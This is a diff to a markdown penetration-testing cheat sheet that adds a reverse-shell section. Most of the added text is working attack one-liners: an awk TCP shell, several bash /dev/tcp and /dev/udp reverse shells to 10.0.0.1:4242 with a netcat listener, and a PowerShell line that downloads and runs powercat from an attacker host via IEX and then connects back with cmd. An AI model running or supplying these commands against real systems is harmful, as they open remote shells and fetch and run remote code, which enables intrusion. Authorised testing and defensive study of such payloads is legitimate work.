@@ -1,11 +1,51 @@
 * [Reverse Shell](#reverse-shell)
+	* [Awk](#awk)
+	* [Bash TCP](#bash-tcp)
+	* [Bash UDP](#bash-udp)
+	* [PowerShell](#powershell)
 * [Spawn TTY Shell](#spawn-tty-shell)
-* 	* [Python](#python)
+	* [Python](#python)
 	* [Perl](#perl)
 * [Extension Linux](#extension-linux)
 * [IP address bypass](#ip-address-bypass)
 * [Useful Regex](#useful-regex)
 * [References](#references)
+
+## Reverse Shell
+### Awk
+```awk
+awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+```
+
+### Bash TCP
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+```
+
+### Bash UDP
+```bash
+Victim:
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+
+Listener:
+nc -u -lvp 4242
+```
+
+### Powershell
+```powershell
+Victim:
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
+
+Attacker:
+git clone https://github.com/besimorhino/powercat.git
+cd powercat
+python3 -m http.server 8080
+nc -lvp 1337
+```
 
 ## Spawn TTY Shell
 ### Python
